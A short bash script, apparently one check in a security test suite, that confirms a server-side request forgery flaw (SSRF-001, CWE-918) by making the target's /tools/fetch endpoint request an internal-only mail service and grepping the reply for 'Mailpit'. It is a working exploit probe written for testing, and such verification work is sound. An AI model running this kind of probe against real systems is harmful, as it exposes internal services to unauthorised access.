#!/usr/bin/env bash
# SSRF-001 (CWE-918): the server fetches an attacker-supplied URL, so it can be
# pointed at the internal-only mail service (no host port of its own).
set -eu
. "$(dirname "$0")/_lib.sh"
curl -s -G --data-urlencode "url=http://mailpit:8025/" "$TARGET/tools/fetch" \
  | grep -q 'Mailpit'
